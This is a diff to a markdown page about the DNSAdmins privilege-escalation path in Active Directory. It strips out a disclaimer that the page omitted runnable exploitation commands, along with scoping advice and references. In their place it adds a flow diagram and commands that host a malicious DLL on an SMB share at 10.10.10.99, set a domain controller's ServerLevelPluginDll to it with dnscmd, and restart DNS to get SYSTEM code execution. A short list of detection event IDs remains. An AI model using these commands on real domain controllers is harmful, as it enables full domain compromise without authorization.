@@ -10,21 +10,38 @@ mitre: null
 tag: null
 ---
 
+
 # DNSAdmins service control
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **DNS service registry `ServerLevelPluginDll`** on a DC.
 
-## Detection
+### Concept (deep)
+`DNSAdmins` can set **`ServerLevelPluginDll`** via RPC. The DNS service runs as **SYSTEM on a DC** and loads the DLL on restart → **SYSTEM code execution on the DC**.
+
+### Attack flow (Mermaid)
+```mermaid
+flowchart TD
+    A[DNSAdmins member] --> B[dnscmd /config /serverlevelplugindll]
+    B --> C[Restart DNS service]
+    C --> D[SYSTEM loads attacker DLL]
+    D --> E[Code execution on DC]
+```
+
+### Commands
+```bash
+# ── Host the DLL ─────────────────────────────────────────────────────
+impacket-smbserver share ./dll -smb2support
+
+# ── Point DNS at the DLL ─────────────────────────────────────────────
+dnscmd DC01 /config /serverlevelplugindll \\10.10.10.99\share\evil.dll
+
+# ── Restart DNS ──────────────────────────────────────────────────────
+sc \\DC01 stop dns
+sc \\DC01 start dns
+```
+
+### Detection
 DNS registry **`ServerLevelPluginDll`** (**4657**); DNS service restart (**7036**); `dns.exe` loading a non-Microsoft DLL (**Sysmon 7**).
 
 ---
-
-## References
-
-- [Microsoft: Domain Name System in Windows Server](https://learn.microsoft.com/en-us/windows-server/networking/dns/dns-overview)
-- [BloodHound documentation](https://bloodhound.specterops.io/)
